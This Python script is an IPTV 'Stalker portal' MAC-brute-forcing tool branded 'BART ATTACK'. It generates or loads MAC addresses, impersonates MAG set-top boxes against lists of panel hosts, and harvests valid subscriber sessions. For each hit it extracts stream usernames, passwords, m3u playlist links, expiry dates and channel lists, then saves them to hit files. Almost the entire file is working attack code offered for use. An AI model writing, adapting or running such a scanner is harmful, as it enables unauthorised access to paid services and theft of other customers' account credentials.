import os,pip
import datetime,os
import socket,hashlib
import json,random,sys, time,re
from playsound import playsound
try:
	if nickn=="":
		nickn=" 🅶🅱/🆄🅺 🆂🆃🅰🅻🅺🅴🆁 🅿🅾🆁🆃🅰🅻  "
except:
	nickn=" 🅶🅱/🆄🅺 🆂🆃🅰🅻🅺🅴🆁 🅿🅾🆁🆃🅰🅻  "
try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except:pass
import subprocess
try:
	import threading
except:pass
import pathlib
#subprocess.run(["clear", ""])
try:
	import requests
except:
	print("requests module is not installed \n Loading requests module \n")
	pip.main(['install', 'requests'])
import requests
try:
	import sock
except:
	print("no sock module installed \n Loading the sock module \n")
	pip.main(['install', 'requests[socks]'] )
	pip.main(['install', 'sock'] )
	pip.main(['install', 'socks'] )
	pip.main(['install', 'PySocks'] )
import sock
#subprocess.run(["clear", ""])
import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
try:
	import cfscrape
	sesq= requests.Session()
	ses = cfscrape.create_scraper(sess=sesq)
except:
	ses= requests.Session()
logging.captureWarnings(True)
os.system('cls')
yanpanel="hata" 
imzayan="" 
bul=0
hitc=0
cpm=0

macSayisi=999999999999991# 1#deneme sayisı
feyzo=("""\33[0m\33[33m╔══════════════════════════════════        
║████  ████ ██ ░░ ██ ██████ ░ ████ ░░░         
║██ ░░ ██ ░░ ██  ██ ░░░░ ██ ░██ ░██ ░░        
║████  ████ ░ ████ ░░░ ██ ░ ██ ░░░██ ░     
║██ ░░ ██ ░░░░ ██ ░░ ██ ░░░░ ██ ░██ ░░      
║██ ░░ ████ ░░ ██ ░░ ██████ ░ ████ ░░░        
╚══════════════════════════════════      
\33[0m\33[0m\33[0m\33[1;7;100m                                        
     GB/UK STALKER PORTAL            
      (((BART ATTACK)))              
      ENGLISH MOD BY BART            
                                     
\33[0;1;5;m
      GB UK STALKER PORTAL                 
\33[0m\33[1;44m
REVERSE ATTACK SCANNING  [ PROARTIX ]       \33[0m           
\33[0;1m""")
print(feyzo) 
kisacikti=""
#pattern= "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"
ozelmac=""
#################
nick=' 🍿 🅔🅥🅔🅡🅨 🅗🅘🅣 🅒🎯🅤🅝🅣🅢 🍿 '
bekleme=1
isimle=""
print("\033[H\033[J", end="")
print(feyzo) 
intro="""\33[1m
- Default: portal.php

	1= portal.php   
	2= server/load.php
        3= stalker_portal  
        4= portalstb/portal.php
        5= k/portal.php
        6= maglove/portal.php
        7= XUI /c/server/load.php
        8= XUI /c/portal.php
        9= bs.mag.portal.php
        10= portalcc.php
        11- magLoad.php
        12= ministra/portal.php
        13= portalmega.php
        14= magportal/portal.php
        15= powerfull/portal.php
        16= realblue
"""
intro=intro+"""\33[1m

 Press Enter or number..."""
panel = input(intro)
print('\33[0m')
speed=""
uzmanm="portal.php"
useragent="okhttp/4.7.1"
if  panel=="" or panel=="1":
    	uzmanm="portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
     	
if panel=="2":
    	uzmanm="server/load.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

if panel=="3":
    	uzmanm="stalker_portal/server/load.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

if panel=="4":
    	uzmanm="portalstb/portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

if panel=="5":
    	uzmanm="k/portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

if panel=="6":
    	uzmanm="maglove/portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

if panel=="7":
    	uzmanm="c/server/load.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

if panel=="8":
    	uzmanm="c/portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

if panel=="9":
    	uzmanm="bs.mag.portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

if panel=="10":
    	uzmanm="portalcc.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

if panel=="11":
    	uzmanm="magLoad.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

if panel=="12":
    	uzmanm="ministra/portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

if panel=="13":
    	uzmanm="portalmega.php"
    	uzmanc="realblue"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3"

if panel=="14":
    	uzmanm="magportal/portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

if panel=="15":
    	uzmanm="powerfull/portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
 
realblue=""
if panel=="16":
	realblue="real"
print('\33[0m')	
print(panel)
kanalkata="0"
panel='feyzo'
print("\033[H\033[J", end="")
print(feyzo)
totLen="000000"
dosyaa=""
yeninesil=(
'D4:CF:F9:',
'33:44:CF:',
'10:27:BE:',
'A0:BB:3E:',
'55:93:EA:',  
'04:D6:AA:',
'11:33:01:',
'00:1C:19:',
'1A:00:6A:',
'1A:00:FB:',
'00:A1:79:',
'00:1B:79:',
'00:2A:79:',
'00:1A:79:',
)
dir='./combo/'
if not os.path.exists(dir):
    os.mkdir(dir)
if "1"=="1":
 	say=0
 	dsy=""
 	dir='./panel_list/'
 	for files in os.listdir (dir):
 		say=say+1
 		dsy=dsy+"	"+str(say)+"=⫸ "+files+'\n'
 	print ("""Choose your PANEL list combo from the list below!!!
"""+dsy+"""
\33[1m There are """ +str(say)+""" files found in combo folder.
Select a PANEL(link) combo list""")
 	dsyno=str(input(" \33[1mCombo No = \33[0m"))
 	say=0
 	if "1"=="1":#else:
	 	for files in os.listdir (dir):
	 			say=say+1
	 			if dsyno==str(say):
	 				pdosya=(dir+files)
	 				break
	 	say=0
	 	if not pdosya=="":
	 		print(pdosya)
	 	else:
	 		print("\033[H\033[J", end="")
	 		print("Incorrect combo file selection...!")
	 		quit()
	 	panelc=open(pdosya, 'r')
	 	paneltotLen=panelc.readlines()
	 	paneluz=(len(paneltotLen))
print("\033[H\033[J", end="")

if "1"=="1":
 	say=0
 	dsy=""
 	dsy="\n       \33[1;4;94;47m 0=⫸ Random MAC  \33[0m\n"
 	dir='./combo/'
 	for files in os.listdir (dir):
 		say=say+1
 		dsy=dsy+"	"+str(say)+"=⫸ "+files+'\n'
 	print ("""\33[1mChoose your MAC combo from the list below!!!
"""+dsy+"""
\33[1m There are """ +str(say)+""" files found in combo folder.
Select a MAC combo list	""")
 	dsyno=str(input(" \33[1mCombo No = \33[0m"))
 	say=0
 	
 	if dsyno=="0":
 		print("\033[H\033[J", end="")
 		print(feyzo) 
 		nnesil=str(yeninesil)
 		nnesil=(nnesil.count(',')+1)
 		for xd in range(0,(nnesil)):
 			tire='  》'
 			if int(xd) <9:
 				tire='   》'
 			print(str(xd+1)+tire+yeninesil[xd])
 		mactur=input("Select the type of Mac...\n Answer=")
 		if mactur=="":
 			mactur=14
 		#print(mactur)
 		mactur=yeninesil[int(mactur)-1]
 		print(mactur)
 		macuz=input("""
 		
 Number of macs to generate

 Quantity:""")
 		if macuz=="":
 			macuz=30000
 		macuz=int(macuz) 
 		print(macuz)
 	else:
	 	for files in os.listdir (dir):
	 			say=say+1
	 			if dsyno==str(say):
	 				dosyaa=(dir+files)
	 				break
	 	say=0
	 	if not dosyaa=="":
	 		print(dosyaa)
	 	else:
	 		print("\033[H\033[J", end="")
	 		print("Wrong combo file selection...!")
	 		quit()
	 	macc=open(dosyaa, 'r')
	 	mactotLen=macc.readlines()
	 	macuz=(len(mactotLen))
 	print("\033[H\033[J", end="")
 	print(feyzo) 
 	baslama=""

 	if not baslama =="":
 		baslama=int(baslama)
 		csay=baslama
botsay=0
botkac=5
 		
kanalkata="0"
kanalkata=input("""\33[1;40m
What do you want to show in the results?


	0= Connection data only
	1= Channels only
	2= Show everything (Live vod series)

\33[1mOption: """)
if kanalkata=="":
	kanalkata="0"


ip=""
fname=""
adult=""
play_token=""
acount_id=""
stb_id=""
stb_type=""
sespas=""
stb_c=""
timezon=""
tloca=""
       

acount_id=""
a="0123456789ABCDEF"
sd=0
vpnsay=0
hitsay=0
onsay=0
sdd=0
vsay=0
bad=0
proxies=""
say=1
print(pdosya)
dosyaadi=str(input("""
Type the name of the new hit File. 
FileName= """))
if dosyaadi=="":
	dosyaadi="GrumpyBugger"
hits='./Hits/'
if not os.path.exists(hits):
    os.mkdir(hits)
Dosyab=hits+dosyaadi+".txt"
say=1
def yax(hits):
    dosya=open(Dosyab,'a+', encoding='utf-8') 
    dosya.write(hits)
    dosya.close()	
    
    
def month_string_to_number(ay):
    m = {
        'jan': 1,
        'feb': 2,
        'mar': 3,
        'apr':4,
         'may':5,
         'jun':6,
         'jul':7,
         'aug':8,
         'sep':9,
         'oct':10,
         'nov':11,
         'dec':12
        }
    s = ay.strip()[:3].lower()
    try:
        out = m[s]
        return out
    except:
        raise ValueError('Not a month')
import time
from datetime import date
def tarih_clear(trh):
	#trh=tarih_exp
	ay=""
	gun=""
	yil=""
	trai=""
	my_date=""
	sontrh=""
	out=""
	ay=str(trh.split(' ')[0])
	gun=str(trh.split(', ')[0].split(' ')[1])
	yil=str(trh.split(', ')[1])
	ay=str(month_string_to_number(ay))
	#print(ay)
	trai=str(gun)+'/'+str(ay)+'/'+str(yil)
	my_date = str(trai)
	#print(my_date)
	if 1==1:
		
		d = date(int(yil), int(ay), int(gun))
		sontrh = time.mktime(d.timetuple())
		out=(int((sontrh-time.time())/86400))
		return out
	#except:pass
macs=""	
sayi=1

def randommac():
	try:
		genmac = str(mactur)+"%02x:%02x:%02x"% ((random.randint(0, 256)),(random.randint(0, 256)),(random.randint(0, 256)))
		#print(genmac)
	except:pass
	genmac=genmac.replace(':100',':10')
	return genmac
	
def url1(panel):
	url="http://"+panel+"/"+uzmanm+"?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml" 
	return url

def url22(panel,macs):
	url2="http://"+panel+"/"+uzmanm+"?type=stb&action=get_profile&JsHttpRequest=1-xml" 

	if realblue=="real":
		url2="http://"+panel+"/"+uzmanm+"?&action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"
	return url2
		
def url3(panel):
	url3="http://"+panel+"/"+uzmanm+"?type=account_info&action=get_main_info&JsHttpRequest=1-xml" 
	return url3

def url5(panel):
	url5="http://"+panel+"/"+uzmanm+"?action=create_link&type=itv&cmd=ffmpeg%20http://localhost/ch/106422_&JsHttpRequest=1-xml"
	return url5

def url6(panel):
	url6="http://"+panel+"/"+uzmanm+"?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"
	return url6

def liveurl(panel):
	liveurl="http://"+panel+"/"+uzmanm+"?action=get_genres&type=itv&JsHttpRequest=1-xml"
	return liveurl

def vodurl(panel):
	vodurl="http://"+panel+"/"+uzmanm+"?action=get_categories&type=vod&JsHttpRequest=1-xml"
	return vodurl

def seriesurl(panel):
	seriesurl="http://"+panel+"/"+uzmanm+"?action=get_categories&type=series&JsHttpRequest=1-xml"
	return seriesurl

def url(cid,panel):
	url7="http://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/"+str(cid)+"_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml" 
	return url7

def hea1(panel,macs):
	HEADERA={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
}
	return 	HEADERA

def hea2(macs,token,panel):
	tokens=token
	HEADERd={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+tokens,
	}
	return HEADERd

def hea3(panel):
	hea={
"Icy-MetaData": "1",
"User-Agent": "Lavf/57.83.100", 
"Accept-Encoding": "identity",
"Host": panel,
"Accept": "*/*",
"Range": "bytes=0-",
"Connection": "close",
	}
	return hea
hityaz=0
	
def hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,panel):
	global hitr
	global hityaz
	try:
		imza="""
		
╭─➤ Hit me baby one more time..      
├●Real ➤ """+str(real)+"""
├●Panel➤ http://"""+str(panel)+"""/c/
├●Mac ➤"""+str(mac)+"""
├─◉Exp➤"""+str(trh)+"""
╰──◉ 𝗖𝗼𝗻𝗳𝗶𝗴 ʙʏ 🅱🅰🆁🆃  
╭➤🔸𝑮𝑩\𝑼𝑲 𝑺𝑻𝑨𝑳𝑲𝑬𝑹 𝑷𝑶𝑹𝑻𝑨𝑳🔸
├●Image➤"""+str(durum)+"""
╰─●Vpn➤"""+str(vpn)+"""
╭─➤ 🅶🅱/🆄🅺 🆂🆃🅰🅻🅺🅴🆁 🅿🅾🆁🆃🅰🅻 
╰──● ❪❪❪🆅🅸🆂🅸🆃 🆄🆂 🅾🅽 🅵🅰🅲🅴🅱🅾🅾🅺 ❫❫❫ 
"""+str(playerapi)+"""
╭─➤ 𝑮𝑩\𝑼𝑲 𝑺𝑻𝑨𝑳𝑲𝑬𝑹 𝑷𝑶𝑹𝑻𝑨𝑳 
╰──● Hit me baby one more time.. 
╭─➤  𝗛𝗶𝘁𝘀 ʙʏ  """+str(nickn)+"""     
╰──●m3uLink➤"""+str(m3ulink)+"""
"""
		if  kanalkata=="1" or kanalkata=="2":
			imza=imza+"""╭─●🅻🅸🆅🅴🅻🅸🆂🆃─➤
╰─➤"""+str(livelist)+""" """
		if kanalkata=="2":
			imza=imza+"""
╭─●🆅🅾🅳🅻🅸🆂🆃─➤
╰─➤"""+str(vodlist)+"""
╭─●🆂🅴🆁🅸🅴🆂🅻🅸🆂🆃─➤
╰─➤"""+str(serieslist)+"""

"""
		yax(imza)
		yaxT(imzaT)
		hityaz=hityaz+1
		print(imza)
		if hityaz >= hitc:
			hitr="\33[1;33m"
	except:pass
cpm=0
cpmx=0
hitr="\33[1;33m"

def echok(mac,bot,total,hitc,oran,tokenr,panel):
	global cpm
	global hitr
	try:
		cpmx=(time.time()-cpm)
		cpmx=(round(60/cpmx))
		if str(cpmx)=="0":
			cpm=cpm
		else:
			cpm=cpmx
		echo=("""
╭● \33[1mBart Atak GB/UK STALKER PORTAL    
├● \33[0m\33[1;107;44m PanelLink  \33[1;7m """+str(panel)+""" \33[0m 
├─● """+tokenr+str(mac)+"""  \33[0m\33[1mCPM="""+str(cpm)+"""  \33[0m
╰──● \33[1;33mTotal="""+str(total)+"""\33[0m \33[1;33m"""+str(hitr)+"""Hit=""" +str(hitc)+"""  \33[0m \33[1;33m%"""+str(oran)+"""  \33[0m""")
		print(echo)
		cpm=time.time()
	except:pass
	
def vpnip(ip):
	url9="https://freegeoip.app/json/"+ip
	vpnip=""
	veri=""
	try:
		res = ses.get(url9,  timeout=7, verify=False)
		veri=str(res.text)
		if not '404 page' in veri:
			vpnips=veri.split('"country_name":"')[1]
			vpn=vpnips.split('"')[0]
		else:
			vpn="Not Invalid"
	except:
		vpn="Not Invalid"
	return vpn

def goruntu(link,panel):
	try:
		res = ses.get(link,  headers=hea3(panel), timeout=(2,5), allow_redirects=False,stream=True)
		duru="𝙑𝙋𝙉「 𝗞𝗨𝗟𝗟𝗔𝗡 」🔒✔ "
		if res.status_code==302:
			 duru="🆅🅰🆁 ✅😎 "
	except:
		duru="𝙑𝙋𝙉「 𝗞𝗨𝗟𝗟𝗔𝗡 」🔒✔ "
	return duru

tokenr="\33[0m"								
def hitprint(mac,trh):
	playsound('./Python_Portable/settings/sounds/retrojump.wav')
	file = pathlib.Path()
	try:
		if file.exists():
		    ad.mediaPlay()
		    
	except:pass
	print('   \33[0m\33[1;43m      *** HIT ***       \33[0m')
	
def list(listlink,macs,token,livel,panel):
	kategori=""
	veri=""
	bag=0
	while True:
		try:
			res = ses.get(listlink,  headers=hea2(macs,token,panel), timeout=15, verify=False)
			veri=str(res.text)
			break
		except:
			bag=bag+1
			time.sleep(1)
			if bag==12:
				break
			
	if veri.count('title":"')>1:
			for i in veri.split('title":"'):
				try:
					kanal=""
					kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
				except:pass
				kategori=kategori+kanal+livel
	
	list=kategori
	return list
	
def m3uapi(playerlink,macs,token,panel):
	mt=""
	bag=0
	
	while True:
			try:
				res = ses.get(playerlink, headers=hea2(macs,token,panel), timeout=7, verify=False)
				veri=""
				veri=str(res.text)
				break
			except:
				time.sleep(1)
				bag=bag+1
				if bag==6:
					break
	try:
			acon=""
			if 'active_cons' in veri:
				acon=veri.split('active_cons":')[1]
				acon=acon.split(',')[0]
				acon=acon.replace('"',"")
				mcon=veri.split('max_connections":')[1]
				mcon=mcon.split(',')[0]
				mcon=mcon.replace('"',"")
				status=veri.split('status":')[1]
				status=status.split(',')[0]
				status=status.replace('"',"")
				timezone=veri.split('timezone":"')[1]
				timezone=timezone.split('",')[0]
				timezone=timezone.replace("\/","/")
				realm=veri.split('url":')[1]
				realm=realm.split(',')[0]
				realm=realm.replace('"',"")
				port=veri.split('port":')[1]
				port=port.split(',')[0]
				port=port.replace('"',"")
				userm=veri.split('username":')[1]
				userm=userm.split(',')[0]
				userm=userm.replace('"',"")
				pasm=veri.split('password":')[1]
				pasm=pasm.split(',')[0]
				pasm=pasm.replace('"',"")
				bitism=""
				bitism=veri.split('exp_date":')[1]
				bitism=bitism.split(',')[0]
				bitism=bitism.replace('"',"")
				
				message=veri.split('message":"')[1].split(',')[0].replace('"','')
				message=str(message.encode('utf-8').decode("unicode-escape")).replace('\/','/')
				
				
				if bitism=="null":
					bitism="Unlimited"
				else:
					bitism=(datetime.datetime.fromtimestamp(int(bitism)).strftime('%d-%m-%Y %H:%M:%S'))			
					mt=("""╭─➤ 𝗛𝗶𝘁𝘀 ʙʏ  """+str(nickn)+"""     
├─➤Message➤ """+str(message)+""" 
├●🔸🌐Host➤ http://"""+panel+"""/c/
├◉🔴️🌍Real➤ http://"""+realm+""":"""+port+"""/c/
╰─●🔸📡Port➤ """+port+"""
╭──◉ 𝗖𝗼𝗻𝗳𝗶𝗴 ʙʏ 🅱🅰🆁🆃  
├◉🔴👩‍User➤ """+userm+"""
├●🔴🔑Pass➤ """+pasm+"""
├─●🔸📆Exp.➤ """+bitism+""" 
├──●🔸👩ActCon➤ """+acon+"""
├──●🔸👪MaxCon➤ """+mcon+""" 
├─●🔸🌐Status➤ """+status+"""
├●🔸⏰TimeZone➤ """+timezone+"""
╰──●🔸 🅶🅱\🆄🅺 🆂🆃🅰🅻🅺🅴🆁 🅿🅾🆁🆃🅰🅻   """)
	except:pass
	return mt
pattern= "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"		
panelsay=0	
bots =0
botsay=0
def basla():
	global panelsay,botsay
	for j in range(botkac):
		for i in open(pdosya, 'r'):
			t1 = threading.Thread(target=d1)
			t1.start()
		botsay=botsay+1
		panelsay=0
		
def d1():
	global hitc
	global hitr
	global tokenr,bots,panelsay,botsay,bot
	panel=(paneltotLen[panelsay].replace('\n',''))
	panel=panel.replace("http://","")
	panel=panel.replace("/c","")
	panel=panel.replace("/","")
	panelsay=panelsay+1
	bots=bots+1
	for mc in range(botsay,macuz,4):
		total=mc
		if dsyno=="0":
		    mac=randommac()
		else:
		    #mac=mactotLen[mc].replace('\n','')
		    macv=re.search(pattern,mactotLen[mc],re.IGNORECASE)
		    if macv:
		        mac=macv.group()
		    else:
		         continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_"+str(int(bots+1))
		oran=""
		oran=round(((total)/(macuz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr,panel)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1(panel), headers=hea1(panel,macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				break
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url22(panel,macs), headers=hea2(macs,token,panel), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3(panel), headers=hea2(macs,token,panel), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
			     			#print(str(url6(panel)+"6"))
				     		res = ses.get(url6(panel), headers=hea2(macs,token,panel), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="Invalid Opps"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(str(cid),panel), headers=hea2(macs,token,panel), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real='http://'+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8" 
				     		durum=goruntu(link,panel)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token,panel)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token,panel)
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="Müşteri IP Adresi yok"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl(panel)
			     		livel=' «◉» '
			     		livelist=list(listlink,macs,token,livel,panel)
			     	if kanalkata=="2":
			     		listlink=vodurl(panel)
			     		livel=' «●» '
			     		vodlist=list(listlink,macs,token,livel,panel)
			     		listlink=seriesurl(panel)
			     		livel=' «●» '
			     		serieslist=list(listlink,macs,token,livel,panel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,panel)

basla()